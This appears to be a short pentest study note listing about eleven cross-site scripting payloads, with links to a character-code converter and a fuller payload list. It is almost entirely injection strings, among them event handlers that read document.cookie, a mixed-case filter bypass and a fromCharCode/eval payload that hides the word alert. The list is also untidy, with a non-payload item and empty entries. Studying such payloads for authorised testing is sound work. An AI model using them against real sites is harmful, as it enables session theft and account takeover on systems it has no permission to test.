
### 10 Top XSS Payloads 


1- `<script>alert("1")</script>`  


2- `<sCript> alert("bypassing simple filters") </sCRIpt>` 


3- PentesterLab 


4- `<a onmouseover="alert(document.cookie)">xxs link</a> | <a onmouseover=alert(document.cookie)>xxs link</a>`


5- `<img src='zzzz' onerror='alert(1)' />` 


6- `<div style="color:red" onclick=alert('xss')>`  | Coloring is adding to see the div


7- `<div style="color:green" onmouseover=alert('xss') >`


8- `<script>console.log("test")</script>` |  __Tests if word script is allowed but alert is not__


9- <img src="cc" onerror=eval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))> | __alert is not allowed__ 


10- `</script><script>alert('XSS');</script>` | __escaping script tags to excute the payload__


11- `';alert('xss');//`  | The apostrophe character is used to escape in PHP __'__


12- 

### Extra Resources:

- [Convert Characters to ASCII Codes](https://www.browserling.com/tools/text-to-ascii)

- [Complete List of XSS Payloads:](https://github.com/nairuzabulhul/RoadMap/blob/master/PTP/Web_Security/XSS_Payload_List.txt)

- 
